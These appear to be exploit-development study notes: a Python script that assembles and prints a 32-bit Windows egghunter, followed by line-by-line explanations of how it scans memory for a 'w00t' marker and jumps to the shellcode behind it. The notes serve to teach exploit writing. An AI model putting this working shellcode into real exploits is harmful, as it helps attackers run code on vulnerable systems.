```
from keystone import *

CODE = (
		# We use the edx register as a memory page counter
"							 " 
"	loop_inc_page:			 "
		# Go to the last address in the memory page
"		or dx, 0x0fff		;" 
"	loop_inc_one:			 "
		# Increase the memory counter by one
"		inc edx				;"
"	loop_check:				 "
		# Save the edx register which holds our memory 
		# address on the stack
"		push edx			;"
		# Push the system call number
"		push 0x2 			;" 
		# Initialize the call to NtAccessCheckAndAuditAlarm
"		pop eax				;" 
		# Perform the system call
"		int 0x2e			;" 
		# Check for access violation, 0xc0000005 
		# (ACCESS_VIOLATION)
"		cmp al,05			;" 
		# Restore the edx register to check later 
		# for our egg
"		pop edx				;" 
"	loop_check_valid:		 "
		# If access violation encountered, go to n
		# ext page
"		je loop_inc_page	;" 
"	is_egg:					 "
		# Load egg (w00t in this example) into 
		# the eax register
"		mov eax, 0x74303077	;" 
		# Initializes pointer with current checked 
		# address 
"		mov edi, edx		;" 
		# Compare eax with doubleword at edi and 
		# set status flags
"		scasd				;" 
		# No match, we will increase our memory 
		# counter by one
"		jnz loop_inc_one	;" 
		# First part of the egg detected, check for 
		# the second part
"		scasd				;" 
		# No match, we found just a location 
		# with half an egg
"		jnz loop_inc_one	;" 
"	matched:				 "
		# The edi register points to the first 
		# byte of our buffer, we can jump to it
"		jmp edi				;" 
)

# Initialize engine in 32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
egghunter = ""
for dec in encoding: 
  egghunter += "\\x{0:02x}".format(int(dec)).rstrip("\n")
  
print("egghunter = (\"" + egghunter + "\")")
```

- loop_inc_page + loop_inc_one: avoids null bytes and goes to last memory address of a page, then increments by one to go to the first of the next page
- loop_check: pushes values for the system call and compares return value to access violation value
- loop_check_valid: if those values matched (address is invalid), jump back up to get next memory page
- is_egg: if they didn't match (address is valid), load first DWORD of egg and compare with the address' value. `scasd` compares the value in EAX with the first DWORD pointed to by EDI then increments EDI by DWORD. If no match, jump back up to increment memory address, else move to compare the second word (assumes repeated DWORD egg). If no match, jump back up to increment.
- matched: if this is reached, the egg matched, jump EIP to EDI
> EDX is used just as a generic register to keep track of what memory location we are scanning. In this case it initially starts at a high address but with be incremented enough as to reset back to 0 and scan from the top of memory